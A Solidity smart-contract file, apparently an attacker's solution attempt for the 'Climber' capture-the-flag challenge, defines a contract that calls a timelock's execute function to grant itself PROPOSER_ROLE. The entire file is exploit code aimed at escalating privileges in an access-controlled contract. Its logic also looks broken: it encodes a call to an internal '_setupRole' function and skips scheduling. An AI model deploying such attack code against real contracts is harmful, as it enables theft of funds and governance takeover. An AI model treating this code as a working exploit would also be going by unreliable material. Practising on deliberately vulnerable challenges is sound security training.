// SPDX-License-Identifier: MIT

import "@openzeppelin/contracts/utils/Address.sol";

pragma solidity ^0.8.0;

interface ITimelock {
    function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt) external payable;
    function updateDelay(uint64 newDelay) external; // just for testing connection
}

contract ClimberAttack {

    ITimelock timelock;

    address owner;

    constructor(
        address _timelockAddress
    ) {
        owner = msg.sender;
        timelock = ITimelock(_timelockAddress);
    }

    function triggerAttack() external {
        require(msg.sender == owner, "Only owner allowed");

        address[] memory _addresses = new address[](1);
        _addresses[0] = address(timelock);

        uint256[] memory _values = new uint256[](1);
        _values[0] = 0;

        bytes[] memory _dataElements = new bytes[](1);
        _dataElements[0] = abi.encodeWithSignature("_setupRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this));

        timelock.execute(
            _addresses, // address[] calldata targets 
            _values, // uint256[] calldata values
            _dataElements, // bytes[] calldata dataElements
            bytes32(bytes("salty")) //bytes32 salt
        );
    }

}